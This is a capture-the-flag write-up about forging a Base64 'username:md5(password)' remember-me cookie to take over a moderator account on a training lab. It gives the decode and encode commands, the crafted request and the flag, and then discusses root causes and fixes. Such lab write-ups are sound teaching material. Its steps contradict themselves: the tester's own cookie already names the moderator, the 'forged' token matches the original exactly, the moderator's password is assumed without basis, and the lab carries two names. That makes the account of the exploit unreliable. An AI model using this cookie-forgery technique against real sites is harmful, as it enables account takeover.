---
title: "Authentication Bypass via Forged Remember-Me Cookie | Skein"
date: 2026-05-31 18:35:00 +0530
categories: [A07 - Authentication Failures, Authentication Bypass]
tags: [webverselabs-pro, authentication-bypass, remember-me-cookie, cookie-tampering, md5, base64, session-management]
author: Shivansh Sharma
image:
path: /assets/images/posts/bump-key.webp
alt: Authentication Bypass via Forged Remember-Me Cookie | Bump Key
-------------------------------------------------------------------

## Lab Link

Lab: [Skein](https://dashboard.webverselabs-pro.com/challenges/bump-key)

---

## Overview

Bump Key is a community platform that implements a custom "Remember Me" feature to persist user authentication between sessions.

Instead of using securely generated server-side tokens, the application stores authentication information directly inside a client-controlled cookie. The cookie contains a Base64-encoded value consisting of a username and an MD5 password hash.

Because the cookie is neither signed nor validated against a server-side token store, attackers can forge authentication tokens and impersonate other users.

This vulnerability ultimately allows authentication bypass and unauthorized access to the moderator account.

---

## Objective

Abuse the remember-me authentication mechanism to gain access to the moderator account and retrieve the flag.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A07 - Authentication Failures
└── Authentication Bypass
    └── Insecure Remember-Me Implementation
        └── Forged Authentication Cookie
```

---

## Reconnaissance

Create a new account and log in to the application.

After authentication, inspect the browser cookies using:

* Browser Developer Tools
* Burp Suite
* Cookie Editor

The application sets two cookies:

```http
Cookie: sk_session=c82fcf515e2246fec487c3f5eef1134e;
rmbr=bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==
```

The `rmbr` cookie appears to be Base64 encoded.

---

## Analyzing the Remember-Me Cookie

Decode the value:

```bash
echo 'bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==' | base64 -d
```

Result:

```text
loomweaver:482c811da5d5b4bc6d497ffa98491e38
```

The structure suggests:

```text
username:md5(password)
```

The hash:

```text
482c811da5d5b4bc6d497ffa98491e38
```

corresponds to:

```text
password123
```

This indicates that authentication data is stored directly inside a client-controlled cookie.

At this point, the application appears vulnerable to authentication bypass.

---

## Enumerating Privileged Users

Navigate to the members page.

A moderator profile is visible:

```text
Marin Loomweaver
@loomweaver
Head Moderator
Member no. SK-0001
```

The target username is:

```text
loomweaver
```

---

## Exploitation

### Step 1 - Create a Forged Token

Construct the authentication value:

```text
loomweaver:482c811da5d5b4bc6d497ffa98491e38
```

Encode it:

```bash
echo -n 'loomweaver:482c811da5d5b4bc6d497ffa98491e38' | base64
```

Result:

```text
bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==
```

---

### Step 2 - Replace the Cookie

Initially replacing only the `rmbr` cookie does not work.

Further testing reveals that the application prioritizes the active session cookie:

```http
sk_session=...
```

over the remember-me token.

The remember-me cookie is only processed when no active session exists.

---

### Step 3 - Remove the Session Cookie

Delete:

```text
sk_session
```

and send only:

```http
Cookie: rmbr=bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==
```

Request:

```http
GET /account HTTP/2
Host: 87e9bda7-4065-bump-key-5ccbe.challenges.webverselabs-pro.com
Cookie: rmbr=bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==
```

The application accepts the forged cookie and authenticates as the moderator.

---

## Proof of Exploitation

Successful authentication displays:

```html
<h1 class="page-head__title">
Welcome back, Marin.
</h1>
```

Role information:

```html
<dt>Role</dt>
<dd>Head Moderator</dd>
```

The moderator account exposes:

```text
Moderator reconciliation reference:
WEBVERSE{27a639dec1fd58f0ae70dfd04ac04413}
```

---

## Flag

```text
WEBVERSE{27a639dec1fd58f0ae70dfd04ac04413}
```

---

## Root Cause Analysis

The application stores authentication state entirely inside a client-controlled cookie.

The remember-me token contains:

```text
username:md5(password)
```

and is trusted without any integrity protection.

Critical weaknesses include:

* Authentication state stored client-side
* Unsigned remember-me cookie
* No cryptographic integrity verification
* MD5 password hash exposure
* No server-side token storage
* No token rotation
* No binding to user sessions

Because the server trusts the cookie contents directly, attackers can forge arbitrary identities.

---

## Impact

An attacker can:

* Impersonate other users
* Bypass authentication
* Access privileged accounts
* Escalate privileges
* Gain unauthorized access to protected functionality

In a real-world application this could lead to:

* Administrative compromise
* Account takeover
* Data exposure
* Persistent unauthorized access

---

## Mitigation

### Use Server-Side Remember-Me Tokens

Generate random tokens:

```text
remember_token = secure_random_value()
```

Store them server-side and associate them with user accounts.

---

### Sign Authentication Cookies

Use HMAC or framework-provided signed cookies to prevent tampering.

---

### Never Store Password Hashes in Cookies

Authentication cookies should never contain:

```text
username
password hash
role
permissions
```

that can be trusted directly by the server.

---

### Use Modern Password Hashing

Replace MD5 with:

```text
Argon2id
bcrypt
scrypt
```

for password storage.

---

### Rotate Remember-Me Tokens

Issue a new token after successful authentication and invalidate previous tokens.

---

## Real-World Insight

Custom remember-me implementations are a common source of authentication vulnerabilities.

Developers frequently assume that Base64 encoding provides security when it merely changes the representation of the data.

Common insecure patterns include:

```text
Base64(username:password)
Base64(username:hash)
Unsigned cookies
Predictable tokens
Client-side authentication state
```

Modern applications should treat all authentication cookies as untrusted input and validate them using server-side mechanisms.

The Bump Key challenge demonstrates a fundamental security principle:

**Authentication decisions should never rely on client-controlled data that lacks integrity protection.**
